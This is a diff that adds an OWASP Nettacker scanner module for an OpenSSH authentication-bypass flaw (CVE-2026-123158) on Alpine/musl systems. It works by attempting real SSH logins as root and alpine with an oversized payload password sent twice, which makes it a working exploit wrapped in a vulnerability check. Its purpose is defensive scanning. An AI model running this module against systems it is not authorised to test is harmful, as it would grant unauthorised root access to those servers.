@@ -1,0 +1,54 @@
+info:
+  name: sshole_cve_2026_123158_vuln
+  author: OWASP Nettacker Team
+  severity: 8.1
+  description: >
+    CVE-2026-123158 (SSHole) is an OpenSSH password authentication bypass affecting Linux
+    systems that use musl libc without PAM, such as Alpine. On a vulnerable server, an oversized password can
+    authenticate to certain accounts whose password field is '*'. The first password exchange is
+    rejected, so this module submits the same 257-byte payload twice within one SSH connection
+    using Nettacker's existing SSH brute-force feature. 
+  reference:
+    - https://www.openssh.org/releasenotes.html#10.6p2
+    - https://alpinelinux.org/posts/2026-11-05-openssh-password-authentication-bypass/
+    - https://nvd.nist.gov/vuln/detail/CVE-2026-123158
+  profiles:
+    - vuln
+    - ssh
+    - high_severity
+    - cve
+    - cve2026
+    - openssh
+    - alpine
+    - authentication_bypass
+    - sshole
+    - cisa_kev
+
+payloads:
+  - library: ssh
+    steps:
+      - method: brute_force
+        timeout: 3
+        authentication_attempts: 2
+        host: "{target}"
+        ports:
+          - 22
+          - 2222
+        usernames:
+          - alpine
+          - root
+        passwords:
+          nettacker_fuzzer:
+            input_format: "{{passwords}}"
+            prefix:
+            suffix:
+            interceptors:
+            data:
+              passwords:
+                read_from_file: passwords/sshole_cve_2026_123158.txt
+        response:
+          condition_type: and
+          conditions:
+            successful_login:
+              regex: ""
+              reverse: false
